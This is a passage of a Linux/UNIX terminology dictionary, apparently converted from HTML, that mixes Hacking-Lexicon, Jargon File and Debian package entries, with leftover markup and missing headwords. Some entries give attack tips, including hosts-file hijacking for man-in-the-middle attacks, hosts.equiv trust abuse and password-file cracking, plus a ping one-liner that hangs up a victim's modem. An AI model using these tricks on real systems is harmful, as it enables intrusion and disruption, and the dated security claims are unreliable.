>This document is designed to be a resource for those Linux users wishing to seek clarification on Linux/UNIX/POSIX related terms and jargon. At approximately 9000 definitions and one thousand pages it is one of the largest Linux related dictionaries currently available. Due to the rapid rate at which new terms are being created it has been decided that this will be an active project. We welcome input into the content of this document. At this moment in time half yearly updates are being envisaged.</P

>&#13;The shell looks for commands and programs in a list of file paths stored in the PATH environment variable. An environment variable stores information in a place where other programs and commands can access it. Environment variables store information such as the shell that you are using, your login name, and your current working directory. To see a list of all the environment variables currently defined; type 'set' at the prompt. When you type a command at the shell prompt, the shell will look for that command's program file in each directory listed in the PATH variable, in order. The first program found matching the command you typed will be run. If the command's program file is not in a directory listed in you PATH environment variable, the shell returns a "commands not found" error. By default, the shell does not look in your current working directory or your home directory for commands This is really a security mechanism so that you don't execute programs by accident. What if a malicious user put a harmful program called ls in your home directory? If you typed ls and the shell looked for the fake program in your home directory before the real program in the /bin directory, what do you think woul dhappen? If you thought bad things, you are on the right track. Since your PATH doesn't have the current directory as one of its search locations, programs in your current directory must be called with an absolute path of a relative path specified as './program-name'. To see what directories are part of your PATH enter this command: # echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/bin/X11 From Complete-Idiot's Guide to Linux

A master hosts file was maintained and downloaded to machines on a regular basis. Then DNS came along. Like the vestigial appendix. On Windows, this file is stored in %SystemRoot%\system32\drivers\etc. Hack: If you can write files to a user's machine, then you can add entries to his/her hosts files to point to your own machine instead. For example, put an entry for www.microsoft.com to point to your machine, then proxy all the connections for the user. This will allow you to perform a man in the middle attack. From Hacking-Lexicon

>&#13;On UNIX, the "hosts.equiv" file lists other hosts that can be thought of as "equivalent" to this one. This machine will therefore "trust" these other machines. Users connecting to this machine from the listed machines will not have to present a password, it is assumed that these other machines have already verified the password. Analogy: The European Union (EU) doesn't have passport control between countries. You only have to present your passport when entering the first European country, then you can roam freely once inside the union. The "hosts.equiv" file creates a similar union of machines. Hack: Hackers will target this file. If their target is machine A, they may instead find that A trusts B, and B may be easier to break into first. At that point, the hacker can hop back to A using an account on B. Likewise, if a hacker can write to this file, they can tell the system to trust any other system on the network (including the hackers own machine). Hack: Older software would do a reverse DNS lookup on a connecting IP address. If the hacker controlled the DNS server, s/he could return a trusted domain name, and therefore be allowed into the system. Another older hack is the default "+" entry. From Hacking-Lexicon

>&#13;The UNIX file that contains the account information, such as username, password, login directory, and default shell. All normal users on the system can read this file. Key point: The passwords are encrypted, so even though everyone can read the file, it doesn't automatically guarantee access to the system. However, programs like crack are very effective at decrypting the passwords. On any system with many accounts, there is a good chance the hacker will be able to crack some of the accounts if they get hold of this file. Key point: Modern UNIX systems allow for shadowed password files, stored in locations like /etc/shadow that only root has access to. The normal password file still exists, minus the password information. This provides backwards compatibility for programs that still must access the password file for account information, but which have no interest in the passwords themselves. Key point: The chief goal of most hacks against UNIX systems is to retrieve the password file. Many attacks do not compromise the machine directly, but are able to read files from the machine, such as this file. From Hacking-Lexicon

>&#13;On UNIX, the configuration file /etc/services maps port numbers to named services. Key point: Its role in life is so that programs can do a getportbyname() sockets call in their code in order to get what port they should use. For example, a POP3 email daemon would do a getportbyname("pop3") in order to retrieve the number 110 that pop3 runs at. The idea is that if all POP3 daemons use getportbyname(), then no matter what POP3 daemon you run, you can always reconfigure its port number by editing /etc/services. Misunderstanding: This file is bad in order to figure out what port numbers mean. If you want to find out what ports programs are using, you should instead use the program lsof to find out exactly which ports are bound to which processes. If running lsof is not appropriate, then you should lookup the ports in a more generic reference. From Hacking-Lexicon

>&#13;The term 0-day exploit describes an exploit that is not publicly known. It describe tools by elite hackers who have discovered a new bug and shared it only with close friends. It also describes some new exploit for compromising popular services (the usual suspects: BIND, FTP services, Linux distros, Microsoft IIS, Solaris servers). Many 0-day exploits are discovered by the victims when hackers use them, or by honeypots. The term "0-day" describes the fact that the value of exploits quickly goes down as soon as they are announced. The next day they are half as valuable. The 2nd day they are a 1/4 as valuable. Ten days later they are 1/1000 as valuable as on day 0. This is because script-kiddies quickly use the exploits on computers throughout the Internet, compromising systems before anybody else can get to them. Contrast: The term 0-day exploit describe the hard-to-use exploits by the discoverer himself (or close friends), in contrast to the easy-to-use scripts employed by script kiddies. For example, a buffer-overflow script will go through many phases as people try to find the right offsets for the target platforms, but will eventually end up as a broad-spectrum aim-and-shoot script that anybody could use. Key point: One of the dangers of 0-day exploits is BUGTRAQ camping. A hacker discovers all the services running on the target victim and waits for day-0 when the exploit is announced. At that time, the hacker attacks the systems with the new exploit. Key point: The term "0-day" describes any bit of information in the community, whether it is serial numbers, lists of proxies, or passwords to porn sites. As soon as such information becomes well-known and exploited by large numbers of people, it is then fixed by the victim. Information has a "half-life": the older it is, the less value it has.

>&#13;On UNIX, a home directory can be referenced by using a tilde (~) followed by their login name. For example, "ls ~rob" on my computer will list all the files in "/home/rob". Key point: Web-servers often allow access to user's directories this way. An example would be http://www.robertgraham.com/~rob. Key point: A big hole on the Internet is that people unexpectedly open up information. For example, the file .bash_history is a hidden file in a person's directory that contains the complete text of all commands they've entered into the shell (assuming their shell is bash, which is the most popular one on Linux).

>&#13;/ad'vent/ n. The prototypical computer adventure game, first designed by Will Crowther on the PDP-10 in the mid-1970s as an attempt at computer-refereed fantasy gaming, and expanded into a puzzle-oriented game by Don Woods at Stanford in 1976. (Woods had been one of the authors of INTERCAL.) Now better known as Adventure or Colossal Cave Adventure, but the TOPS-10 operating system permitted only six-letter filenames. See also vadding, Zork, and Infocom. This game defined the terse, dryly humorous style since expected in text adventure games, and popularized several tag lines that have become fixtures of hacker-speak: "A huge green fierce snake bars the way!" "I see no X here" (for some noun X). "You are in a maze of twisty little passages, all alike." "You are in a little maze of twisty passages, all different." The `magic words' xyzzy and plugh also derive from this game. Crowther, by the way, participated in the exploration of the Mammoth &#38; Flint Ridge cave system; it actually has a `Colossal Cave' and a `Bedquilt' as in the game, and the `Y2' that also turns up is cavers' jargon for a map reference to a secondary entrance.

</B
></DT
><DD
><P
>&#13;The United States encryption standard that replaces the older/weaker DES standard. Contrast: The main impetus behind AES to replace DES is the support for larger key sizes. DES uses 56-bit keys, which can be cracked in just a few minutes (in the year 2001). In contrast, AES supports 128-bit keys (as well as 192-bit and 256-bit). Whereas both DES and AES are fundamentally block-ciphers, AES is also designed to be an efficient stream-cipher and hash algorithm. Whereas DES was designed to be hardware based (software implementations are much slower), AES has been designed to be efficient in both software and hardware. In particular, implementations in ANSI C, Java, and x86 assembly language were important. Another important criteria was the ability for the algorithm to work within smart-cards with slow CPUs and limited memory. Key point: The NIST director in charge of selecting the AES algorithm says: "If Moore's law continues and quantum computing doesn't manifest itself, then I think this system will have a good 30 year run". Misconception: AES does not replace DES. In the 1980s, DES was the most used encryption algorithm. However, due to length of time it took the government to come up with a replacement standard, other encryption algorithms became widely used, such as RC2, RC4, Blowfish, IDEA, and Triple DES. Moreover, crypto has became very "pluggable", with many products supporting numerous simultaneous encryption algorithms. From Hacking-Lexicon

[techspeak] A terminal may be said to be `ANSI' if it meets the ANSI X3.64 standard for terminal control. Unfortunately, this standard was both over-complicated and too permissive. It has been retired and replaced by the ECMA-48 standard, which shares both flaws. 3. n. [BBS jargon] The set of screen-painting codes that most MS-DOS and Amiga computers accept. This comes from the ANSI.SYS device driver that must be loaded on an MS-DOS computer to view such codes. Unfortunately, neither DOS ANSI nor the BBS ANSIs derived from it exactly match the ANSI X3.64 terminal standard. For example, the ESC-[1m code turns on the bold highlight on large machines, but in IBM PC/MS-DOS ANSI, it turns on `intense' (bright) colors. Also, in BBS-land, the term `ANSI' is often used to imply that a particular computer uses or can emulate the IBM high-half character set from MS-DOS. Particular use depends on context. Occasionally, the vanilla ASCII character set is used with the color codes, but on BBSs, ANSI and `IBM characters' tend to go together.  From Jargon Dictionary

>&#13;n. [acronym, `Automated Retroactive Minimal Moderation'] A Usenet cancelbot created by Dick Depew of Munroe Falls, Ohio. ARMM was intended to automatically cancel posts from anonymous-posting sites. Unfortunately, the robot's recognizer for anonymous postings triggered on its own automatically-generated control messages! Transformed by this stroke of programming ineptitude into a monster of Frankensteinian proportions, it broke loose on the night of March 31, 1993 and proceeded to spam news.admin.policy with a recursive explosion of over 200 messages. ARMM's bug produced a recursive cascade of messages each of which mechanically added text to the ID and Subject and some other headers of its parent. This produced a flood of messages in which each header took up several screens and each message ID and subject line got longer and longer and longer. Reactions varied from amusement to outrage. The pathological messages crashed at least one mail system, and upset people paying line charges for their Usenet feeds. One poster described the ARMM debacle as "instant Usenet history" (also establishing the term despew), and it has since been widely cited as a cautionary example of the havoc the combination of good intentions and incompetence can wreak on a network.

>&#13;ARP is a protocol used with TCP/IP to resolve addresses. The TCP/IP stack used to transmit data across the Internet is independent from the Ethernet used to shuttle data between local machines. Thus, when machine needs to send an IP packet to a nearby machine, it broadcasts the IP address on the local Ethernet asking for the corresponding Ethernet address. The machine who owns the address responds, at which point the IP packet in question is sent to that Ethernet address. Key point: By sniffing ARP packets off the wire, you can discover a lot of stuff going on. This is especially true of cable-modem and DSL segments. Since ARP packets are broadcasts, you aren't technically breaking your user's agreement by sniffing.

A major goal of the ARPAnet project was to increase the military's command and control capability enabling communication across a variety of physically dissimilar media, including satellites. An allied goal was to create a robust network capable of withstanding outages, such as those that might result from a nuclear exchange. ARPAnet met these objectives, but it also surprised its creators: It was found in short order that most ARPAnet users preferred to use the network for communication, such as electronic mail and discussion groups. Initially, the ARPAnet was available only to government research institutes and to universities holding Department of Defense (DoD) research contracts.

>&#13;/as'kee/ n. [originally an acronym (American Standard Code for Information Interchange) but now merely conventional] The predominant character set encoding of present-day computers. The standard version uses 7 bits for each character, whereas most earlier codes (including early drafts of ASCII prior to June 1961) used fewer. This change allowed the inclusion of lowercase letters -- a major win -- but it did not provide for accented letters or any other letterforms not used in English (such as the German sharp-S or the ae-ligature which is a letter in, for example, Norwegian). It could be worse, though. It could be much worse. See EBCDIC to understand how. A history of ASCII and its ancestors is at http://www.wps.com/texts/codes/index.html. Computers are much pickier and less flexible about spelling than humans; thus, hackers need to be very precise when talking about characters, and have developed a considerable amount of verbal shorthand for them. Every character has one or more names -- some formal, some concise, some silly. Common jargon names for ASCII characters are collected here. See also individual entries for bang, excl, open, ques, semi, shriek, splat, twiddle, and Yu-Shiang Whole Fish. This list derives from revision 2.3 of the Usenet ASCII pronunciation guide.

The pronunciation of # as `pound' is common in the U.S. but a bad idea; Commonwealth Hackish has its own, rather more apposite use of `pound sign' (confusingly, on British keyboards the pound graphic happens to replace #; thus Britishers sometimes call # on a U.S.-ASCII keyboard `pound', compounding the American error). The U.S. usage derives from an old-fashioned commercial practice of using a # suffix to tag pound weights on bills of lading. The character is usually pronounced `hash' outside the U.S. There are more culture wars over the correct pronunciation of this character than any other, which has led to the ha ha only serious suggestion that it be pronounced `shibboleth' (see Judges 12:6 in an Old Testament or Tanakh). The `uparrow' name for circumflex and `leftarrow' name for underline are historical relics from archaic ASCII (the 1963 version), which had these graphics in those character positions rather than the modern punctuation characters. The `swung dash' or `approximation' sign is not quite the same as tilde in typeset material but the ASCII tilde serves for both (compare angle brackets). Some other common usages cause odd overlaps. The #, $, &#62;, and &#38; characters, for example, are all pronounced "hex" in different communities because various assemblers use them as a prefix tag for hexadecimal constants (in particular, # in many assembler-programming cultures, $ in the 6502 world, &#62; at Texas Instruments, and &#38; on the BBC Micro, Sinclair, and some Z80 machines). See also splat. The inability of ASCII text to correctly represent any of the world's other major languages makes the designers' choice of 7 bits look more and more like a serious misfeature as the use of international networks continues to increase (see software rot). Hardware and software from the U.S. still tends to embody the assumption that ASCII is the universal character set and that characters have 7 bits; this is a major irritant to people who want to use a character set suited to their own languages. Perversely, though, efforts to solve this problem by proliferating `national' character sets produce an evolutionary pressure to use a smaller subset common to all those in use.

>&#13;Today's modems are controlled by the old Hayes "AT" command set. In order to dial the phone number 555-1212 using a modem, you simply send the string "ATDT555-1212" to the modem. The "D" following the "AT" means to "Dial", and the "T" means to use "Tone" dialing (rather than "P" for "Pulse" dialing). The command "ATH0" means to hang up the modem. Key point: One of the juvenile tricks people play is to cause people to hang up their own modem. Once the modem connects, it goes into a different mode where it no longer accepts AT commands. However, a user can switch back to the command mode by sending the characters "+++" to the modem. Therefore, if somebody can remotely trick your PC into sending "+++ATH0", then your modem will hang up. One way of doing this is with the ping program that sends and ICMP echo to the victim, which then replies with the same contents. E.g.: ping -p 2b2b2b415448300d victim The most popular exploits for this are spoofed ICMP pings, but it can be exploited in any number of ways.

An AbulEdu server can handle Mac (netatalk), Windows (samba), GNU/Linux and X terminal (with LTSP) clients. The server acts as a central gateway for Web, mail, and printing, and facilitates the management of classes, pupils, and teachers. Everybody can publish Web pages on an intranet using Apache and all administration tasks are performed using a browser. The result is that a teacher who is not a computer specialist can install and manage a school network. Stable version 1.0.7-II was released May 26, 2003.

>&#13;Access Control List (access, ACL)
</B
></DT
><DD
><P
>&#13;Controlling access not only the system in general, but also resources within the system. For example, firewalls can be configured to allow access to different portions of the network for different users. Likewise, even after you log onto a file server, the server may still block access to certain files. Key point: An Access Control List (ACL) is used to list those accounts that have access to the resource that the list applies to. When talking about firewalls, the ACL implies the list of IP addresses that have access to which ports and systems through the firewall. When talking about WinNT, the ACL implies the list of users that can access a specific file or directory on NTFS. Contrast: Discretionary Access Control is the ability to have fine grained control over who has access to what resources. Misconception: Many people believe that firewall IP address rules or IEEE 802.11 MAC address rules form robust ACLs. However, since neither IP addresses or MAC addresses provide robust authentication, such ACLs provide only a weak form of security. When these so-called ACLs are relied upon for security, they frequently lead to compromises as people spoof their IP or forge their MAC address. From Hacking-Lexicon

Hackers find Ada's exception-handling and inter-process communication features particularly hilarious. Ada Lovelace (the daughter of Lord Byron who became the world's first programmer while cooperating with Charles Babbage on the design of his mechanical computing engines in the mid-1800s) would almost certainly blanch at the use to which her name has latterly been put; the kindest thing that has been said about it is that there is probably a good small language screaming to get out from inside its vast, elephantine bulk.

>&#13;Access control refers to controlling access by a user to a computer system, or data on that system. In formal terms, a "subject" (e.g. a user) attempts to access the "object" (e.g. system or data). An access control system will evaluate the security levels of the subject and object in order to see if access is permitted. Example: A simple example is the case where you enter a username and password in order to log onto the computer. Contrast: mandatory access control The system gives users "clearance levels", and assigns sensitivity levels to information. Therefore, if you only have "secret" clearance level, you cannot access "top-secret" information, but you can access "secret" or "confidential" information. See: Bell-LaPadula Model for more information. discretionary access control This system assigns subjects (users) to one or more groups. An object (system or file) contains a DACL (discretionary access control list) enumeration which users and groups may access the object. See: Access Control List for more information. Key point: There are different kinds of access. Read access means that somebody can read information, whereas write access implies that that somebody can change the data. For example, you can get a copy of your credit report and read it, but you can't necessarily change the data. From Hacking-Lexicon

>&#13;Analysis Console for Intrusion Databases The Analysis Console for Intrusion Databases (ACID) is a PHP-based analysis engine to search and process a database of security events generated by various IDSes, firewalls, and network monitoring tools.  The features currently include: o Query-builder and search interface for finding alerts matching   on alert meta information (e.g. signature, detection time) as well as   the underlying network evidence (e.g. source/destination address, ports,   payload, or flags). o Packet viewer (decoder) will graphically display the layer-3 and   layer-4 packet information of logged alerts o Alert management by providing constructs to logically group alerts   to create incidents (alert groups), deleting the handled alerts or   false positives, exporting to email for collaboration, or archiving of   alerts to transfer them between alert databases. o Chart and statistic generation based on time, sensor, signature, protocol,   IP address, TCP/UDP ports, or classification ACID has the ability to analyze a wide variety of events which are post-processed into its database.  Tools exist for the following formats:  o using Snort (www.snort.org)     - Snort alerts     - tcpdump binary logs  o using logsnorter (www.snort.org/downloads/logsnorter-0.2.tar.gz)     - Cisco PIX     - ipchains     - iptables     - ipfw From Debian 3.0r0 APT

>&#13;algorithm
</B
></DT
><DD
><P
>&#13;A series of rules/procedures for solving a mathematical or logical problem. From an infosec point of few, the most interesting mathematical problems are those of cryptography. Cryptographic algorithms of interest are those for encrypting messages or generating unique hashes. Analogy: An cookbook recipe is an algorithm. Key point: Different algorithms have different levels of complexity. For example, consider the ancient parable (Babylonian?) about a king and a wise subject who did a favor for him. The subject asked for one piece of grain to be placed on the first square of a chess board, two grains on the second, four grains on the third, and so on, doubling the amount of grain for each successive square. This problem demonstrates an algorithm of exponential complexity. For the first 10 squares of the chess board, the series is: 1 2 4 8 16 32 64 128 256 512. Thus, for the first 10 squares, roughly a thousand grains must be paid out. However, the series continues (using K=1024): 1k 2k 4k 8k 32k 64k 128k 256k 512k. Thus, for the first 20 squares, roughly a million grains must be paid out. After 30 squares, roughly a billion grains must be paid out. For 40 squares, roughly a trillion grains must be paid out. This is directly related to such things as key size. A 41-bit key is twice as hard to crack as a 40-bit key. A 50-bit key is a thousand times harder. A 60-bit key is a million times harder. This is why the 128-bit vs. 40-bit encryption debate is so important: 128-bit keys are a trillion trillion times harder to crack (via brute force) than 40-bit keys. Key point: Most algorithms are public, meaning that somebody trying to decrypt your message knows all the details of the algorithm. Consequently, the message is protected solely by the key. Many people try to add additional protection by making the details of the algorithm secret as well. Experience so far has led to the belief that this actually leads to weaker security for two reasons. First, such secrets always get discovered eventually, so if security depends upon this secret, it will eventually be broken. Secondly, human intelligence is such that someone cannot create a secure algorithm on his/her own. Therefore, only by working with a community of experts over many years can humans create a secure algorithm. To date, only two such communities exist: the entire world of cryptography experts publishing the details of their work and trying to break other people's work, and the tightly knit community of cryptography experts working in secret for the NSA.

The `option' key on a Macintosh; use of this term usually reveals that the speaker hacked PCs before coming to the Mac (see also feature key, which is sometimes incorrectly called `alt'). 3. n.,obs. [PDP-10; often capitalized to ALT] Alternate name for the ASCII ESC character (ASCII 0011011), after the keycap labeling on some older terminals; also `altmode' (/awlt'mohd/). This character was almost never pronounced `escape' on an ITS system, in TECO, or under TOPS-10 -- always alt, as in "Type alt alt to end a TECO command" or "alt-U onto the system" (for "log onto the [ITS] system"). This usage probably arose because alt is more convenient to say than `escape', especially when followed by another alt or a character (or another alt and a character, for that matter). 4. The alt hierarchy on Usenet, the tree of newsgroups created by users without a formal vote and approval procedure. There is a myth, not entirely implausible, that alt is acronymic for "anarchists, lunatics, and terrorists"; but in fact it is simply short for "alternative".  From Jargon Dictionary

>&#13;Utilities for Advanced Power Management (APM) On laptop computers, the Advanced Power Management (APM) support provides access to battery status information and may help you to conserve battery power, depending on your laptop and the APM implementation.  The apmd program also lets you run arbitrary programs when APM events happen (for example, you can eject PCMCIA devices when you suspend, or change hard drive timeouts when you connect the battery). This package contains apmd(8), a daemon for logging and acting on APM events; and apm(1), a client that prints the information in /proc/apm in a readable format. apmd is notified of APM events by the APM driver in the kernel. Recent Debian kernels are built with APM support but it is disabled by default.  You need to boot the kernel with the "apm=on" option if you want to enable the driver. (You may need to add this option to your lilo command line.) From Debian 3.0r0 APT

Apps are what systems vendors are forever chasing developers to create for their environments so they can sell more boxes. Hackers tend not to think of the things they themselves run as apps; thus, in hacker parlance the term excludes compilers, program editors, games, and messaging systems, though a user would consider all those to be apps.

The rules are simple: you ride a light cycle (a kind of motorbike that can only turn 90 degrees at a time, leaves a wall behind and cannot be stopped) and have to avoid running into walls while at the same time you have to try to get your opponent to run into them. The idea is based on the Disney movie from 1982 called "Tron".  If you ever wanted to take a try at one of those speed demons features in the movie, this is your chance.  Of all the Tron clones out there, I think one is the one that comes closest to the feeling the movie tries to express. This is in part thanks to the sophisticated camera motions, in part to the superb modelling work and in part to the fabulous sound effects.  To add some extra fascination into the game, unlike to other Tron clones, in armagetron you can accelerate.  Alas, there's no accelerate button.  If you want to drive fast, you have to drive good -- and really really close to the walls. Armagetron can be played against AI opponents, against other humans over the network, or a mixture of both.

>&#13;In infosec, authentication is the process of identifying an individual or data. The goal of authentication is to confirm the identification of an individual, message, file, or other data. The two primary areas of authentication are user authentication (proving that Bob is who he says he is) and message authentication (proving that your nuclear missile launch orders weren't forged or corrupted). The antonym of authentication is forgery. Contrast: Authentication will identify who an individual is; authorization will identify what the individual is allowed to do. Example: When you log in with your username and give the password, you are authenticating yourself to the system. You are proving that you are you because, in theory, only you know your password. Contrast: Abstractly, anything that combats forgery is called authentication. For example, IPsec includes an Authentication Header (AH) that proves that a packet hasn't been modified in transit. However, this feature overlaps with the abstract concept of integrity: both are checked at the same time. Examples: biometrics Signature (handwriting), facial features, fingerprint, etc. smart-card A card with an on-board microprocessor that can run crypto algorithms. For example, it may store a private-key, and be able to encrypt/decrypto tokens with that key. passwords digital certificates A small file containing public or private keys. SecureID A commercial product that uses a key and the current timestamp to generate a stream of random numbers that can be verified by a server. A user has roughly 10 seconds to enter the current number displayed on the card. Contrast: Three things used for authentication: physical (what you have) car keys, subway tokens, driver's license, passport, credit cards, ID cards, smart cards knowledge (what you know) PINs, usernames/passwords, account numbers, mother's maiden name biometrics (who you are) written signature, fingerprint, what you look like, etc. See also: Authentication is often mentioned along with other key security concepts such as integrity, confidentiality, and non-repudiation.

>&#13;Automounting is the process where mounting and unmounting of certain filesystems is done automatically by a daemon. If the filesystem is unmounted, and a user attempts to access it, it will be automatically (re)mounted. This is especially useful in large networked environments and for crossmounting filesystems between a few machines (especially ones which are not always online). It may also be very useful for removable devices, or a few other uses, such as easy switching between a forced-on ascii conversion mount of a dos filesystem and a forced-off ascii conversion mount of the same dos fs. If you are new to Linux and dont understand what mounting and deamons are, then refer to some documentation regarding this. There are two types of automounters in linux; AMD and autofs. AMD is the automount daemon, and supposedly works like the SunOS AMD. It is implemented in user space, meaning it's not part of the kernel. It's not necessary for the kernel to understand automounting if you NFS mount to the local host, through the AMD daemon, which routes all automount filesystem traffic through the NFS system. Autofs is a newer system assisted by the kernel, meaning that the kernel's filesystem code knows where the automount mount points are on an otherwise normal underlying fs, and the automount program takes it from there. Only autofs will be described in this mini-howto. From Automount-miniHOWTO

For example, in the Kosovo war, the European forces bombed power plants in order to destroy the availability of electricity. Another example is in February of the year 2000, when massive DDoS attacks brought down major websites (making them "unavailable"). Controversy: Availability is one of the key sticking points in security. It is easy to secure things simply by making them unavailable: if a computer is turned off, nobody can hack into it. The trick to infosec is making things both available and secure. Examples of this problem are: account lockouts In order to prevent password grinding, computers will lock out accounts when too many bad passwords have been attempted. However, this means that hackers can purposely lock out accounts. firewalls and IDS Some IDSs will reconfigure firewalls, therefore spoofing attacks can cause the firewall to shut people out. fail-close/fail-open So called "proper" security will shut things down when things start to fail; for example, if the firewall crashes, it should shutdown all communication until the firewall is restarted rather than allowin traffic through unchecked. However, web-sites that demand 99.99% uptime are therefore unable to use traditional firewalls. Antonym: The opposite of the infosec term "availability" is the hacking term "DoS".

>&#13;An XML Delivery Toolkit for Apache AxKit is an XML Application Server for Apache.  It provides on-the-fly conversion from XML to any format, such as HTML, WAP or text using either W3C standard techniques, or flexible custom code. AxKit also uses a built-in Perl interpreter to provide some amazingly powerful techniques for XML transformation. The emphasis with AxKit is on separation of content from presentation.  The pipelining technique that AxKit uses allows content to be converted to a presentable format in stages, allowing certain platforms to see data differently to others.  AxKit allows web designers to focus on web site design, content developers to work on a purely content basis, and webmasters to focus on their core competencies. AxKit is based on plugin components.  This allows the web site developer to create a completely custom XML Application Server based around the AxKit API.  AxKit can either automatically provide caching facilities, or you can create your own cache handler, so that XML transformations (which can be time consuming) only happen when required. The toolkit also provides ability to build component based web sites, and dynamic content.  Database integration is fully supported, allowing either deliver of XML from a database, or XML generation from a database query.  Dynamic web components can be built using the Perl language, making the possibilities as infinite as CGI scripts, without the potential mess that CGI programming can cause. From Debian 3.0r0 APT

>&#13;/bay'-sic/ n. A programming language, originally designed for Dartmouth's experimental timesharing system in the early 1960s, which for many years was the leading cause of brain damage in proto-hackers. Edsger W. Dijkstra observed in "Selected Writings on Computing: A Personal Perspective" that "It is practically impossible to teach good programming style to students that have had prior exposure to BASIC: as potential programmers they are mentally mutilated beyond hope of regeneration." This is another case (like Pascal) of the cascading lossage that happens when a language deliberately designed as an educational toy gets taken too seriously. A novice can write short BASIC programs (on the order of 10-20 lines) very easily; writing anything longer (a) is very painful, and (b) encourages bad habits that will make it harder to use more powerful languages well. This wouldn't be so bad if historical accidents hadn't made BASIC so common on low-end micros in the 1980s. As it is, it probably ruined tens of thousands of potential wizards. [1995: Some languages called `BASIC' aren't quite this nasty any more, having acquired Pascal- and C-like procedures and control structures and shed their line numbers. --ESR] Note: the name is commonly parsed as Beginner's All-purpose Symbolic Instruction Code, but this is a backronym. BASIC was originally named Basic, simply because it was a simple and basic programming language. Because most programming language names were in fact acronyms, BASIC was often capitalized just out of habit or to be silly. No acronym for BASIC originally existed or was intended (as one can verify by reading texts through the early 1970s). Later, around the mid-1970s, people began to make up backronyms for BASIC because they weren't sure. Beginner's All-purpose Symbolic Instruction Code is the one that caught on. From Jargon Dictionary

>&#13;// n. [abbreviation, `Basic Combined Programming Language') A programming language developed by Martin Richards in Cambridge in 1967.

It reached break-even point at a very early stage, and was the language in which the original hello world program was written. It has been ported to so many different systems that its creator confesses to having lost count. It has only one data type (a machine word) which can be used as an integer, a character, a floating point number, a pointer, or almost anything else, depending on context.

As of November, 1999, all versions of BIND previous to 8.2.2-P5/4.9.7 have known holes that can be exploited. It is likely that these newer versions also have undiscovered exploitable holes as well. Key point: BIND comes in two versions, 4.x and 8.x. This is largely due to backwards compatibility: people are running a lot of older servers and would rather patch them than upgrade to a newer version. Also, the newer 8.x code-base has not be extensively peer-reviewed and is thought to be a lot less secure than the 4.x source base.

>&#13;An academic model for enforcing access control for government and military. The model is based around the idea of mandator access control. The formal definition from TCSEC is: ...a means of restricting access to objects based on the sensitivity (as represented by a label) of the information contained in the objects and the formal authorization (e.g., clearance) of subjects to access information of such sensitivity In this definition, a "subject" is somebody (user) who wants access to an "object" (information, data file, system). The subject and object have different security levels. Objects (information, data, systems) are assigned security classification levels. A typical example would be: unclassified &#60; confidential &#60; secret &#60; top-secret Subjects are assigned similar clearance levels that allow access to objects of similar level or below. For example, if you are a government employee with "secret" clearance level, you can access everything but "top-secret" information. A classification level such as "top-secret" will also include categories. For example, you may have a "secret" clearance for NATO information, and "top-secret" clearance for all matters pertaining to nuclear weapons. The system follows the principle of least privilege. Therefore, you would not be cleared to access top-secret NATO nuclear plans because your NATO clearance isn't high enough. From Hacking-Lexicon

>&#13;Famed was this Beowulf: far flew the boast of him, son of Scyld, in the Scandian lands. So becomes it a youth to quit him well with his father's friends, by fee and gift, that to aid him, aged, in after days, come warriors willing, should war draw nigh, liegemen loyal: by lauded deeds shall an earl have honor in every clan. Beowulf is the earliest surviving epic poem written in English. It is a story about a hero of great strength and courage who defeted a monster called Grendel. See History to find out more about the Beowulf hero. There are probably as many Beowulf definitions as there are people who build or use Beowulf Supercomputer facilities. Some claim that one can call their system Beowulf only if it is built in the same way as the NASA's original machine. Others go to the other extreme and call Beowulf any system of workstations running parallel code. My definition of Beowulf fits somewhere between the two views described above, and is based on many postings to the Beowulf mailing list: Beowulf is a multi computer architecture which can be used for parallel computations. It is a system which usually consists of one server node, and one or more client nodes connected together via Ethernet or some other network. It is a system built using commodity hardware components, like any PC capable of running Linux, standard Ethernet adapters, and switches. It does not contain any custom hardware components and is trivially reproducible. Beowulf also uses commodity software like the Linux operating system, Parallel Virtual Machine (PVM) and Message Passing Interface (MPI). The server node controls the whole cluster and serves files to the client nodes. It is also the cluster's console and gateway to the outside world. Large Beowulf machines might have more than one server node, and possibly other nodes dedicated to particular tasks, for example consoles or monitoring stations. In most cases client nodes in a Beowulf system are dumb, the dumber the better. Nodes are configured and controlled by the server node, and do only what they are told to do. In a disk-less client configuration, client nodes don't even know their IP address or name until the server tells them what it is. One of the main differences between Beowulf and a Cluster of Workstations (COW) is the fact that Beowulf behaves more like a single machine rather than many workstations. In most cases client nodes do not have keyboards or monitors, and are accessed only via remote login or possibly serial terminal. Beowulf nodes can be thought of as a CPU + memory package which can be plugged in to the cluster, just like a CPU or memory module can be plugged into a motherboard. Beowulf is not a special software package, new network topology or the latest kernel hack. Beowulf is a technology of clustering Linux computers to form a parallel, virtual supercomputer. Although there are many software packages such as kernel modifications, PVM and MPI libraries, and configuration tools which make the Beowulf architecture faster, easier to configure, and much more usable, one can build a Beowulf class machine using standard Linux distribution without any additional software. If you have two networked Linux computers which share at least the /home file system via NFS, and trust each other to execute remote shells (rsh), then it could be argued that you have a simple, two node Beowulf machine.

><P
>&#13;n. [common] A hole in the security of a system deliberately left in place by designers or maintainers. The motivation for such holes is not always sinister; some operating systems, for example, come out of the box with privileged accounts intended for use by field service technicians or the vendor's maintenance programmers. Syn. trap door; may also be called a `wormhole'. See also iron box, cracker, worm, logic bomb. Historically, back doors have often lurked in systems longer than anyone expected or planned, and a few have become widely known. Ken Thompson's 1983 Turing Award lecture to the ACM admitted the existence of a back door in early Unix versions that may have qualified as the most fiendishly clever security hack of all time. In this scheme, the C compiler contained code that would recognize when the `login' command was being recompiled and insert some code recognizing a password chosen by Thompson, giving him entry to the system whether or not an account had been created for him. Normally such a back door could be removed by removing it from the source code for the compiler and recompiling the compiler. But to recompile the compiler, you have to use the compiler -- so Thompson also arranged that the compiler would recognize when it was compiling a version of itself, and insert into the recompiled compiler the code to insert into the recompiled `login' the code to allow Thompson entry -- and, of course, the code to recognize itself and do the whole thing again the next time around! And having done this once, he was then able to recompile the compiler from the original sources; the hack perpetuated itself invisibly, leaving the back door in place and active but with no trace in the sources. The talk that suggested this truly moby hack was published as "Reflections on Trusting Trust", "Communications of the ACM 27", 8 (August 1984), pp. 761-763 (text available at http://www.acm.org/classics). Ken Thompson has since confirmed that this hack was implemented and that the Trojan Horse code did appear in the login binary of a Unix Support group machine. Ken says the crocked compiler was never distributed. Your editor has heard two separate reports that suggest that the crocked login did make it out of Bell Labs, notably to BBN, and that it enabled at least one late-night login across the network by someone using the login name `kt'.

